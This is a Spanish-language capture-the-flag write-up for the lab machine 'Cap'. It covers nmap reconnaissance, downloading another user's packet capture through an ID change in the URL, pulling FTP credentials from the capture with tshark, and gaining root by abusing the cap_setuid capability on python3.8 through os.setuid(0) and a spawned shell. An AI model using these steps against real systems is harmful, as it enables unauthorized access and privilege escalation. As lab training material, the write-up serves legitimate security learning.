---
description: '✍️ Autor: infosecjack 🔍 Dificultad: Fácil 📅 Fecha de creación: 20/09/2021'
---

# Cap

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.245
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.245
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP** el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.11.11
```

para que nos proporcione más información sobre esos puertos específicamente. Entramos a la página web para ver que contiene.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Si modificamos y ponemos `/data/0` cambian los números y si modificamos con otros números se aplica un **Open Redirect**.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos lo descargamos y vemos que son paquetes de Wireshark por lo que los analizamos.

```bash
tshark -r 0.pcap
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Filtramos para ver mejor la información relevante de la captura.

```bash
tshark -r 0.pcap -Y "ftp" 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos salen unas credenciales por lo que nos logueamos. Descargamos los archivos que contiene.

```
ftp nathan@10.10.10.245
get user.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión con el usuario **nathan**.

```bash
ssh nathan@10.10.10.245
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar pero nos pide contraseña. Tampoco tenemos permisos SUID. Pensamos que si la máquina se llama Cap tiene algo que ver con **capabilities** por lo que miramos.

```bash
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>

Muestra que **/usr/bin/python3.8** tiene las capacidades **cap\_setuid** y **cap\_net\_bind\_service**, lo cual no es el valor predeterminado. **CAP\_SETUID** permite cambiar a UID 0 (root) sin necesidad del bit SUID.

Ejecutamos.

```bash
python3.8

import os
os.setuid(0)
os.system("/bin/bash")
```

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (1162).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1163).png" alt=""><figcaption></figcaption></figure>
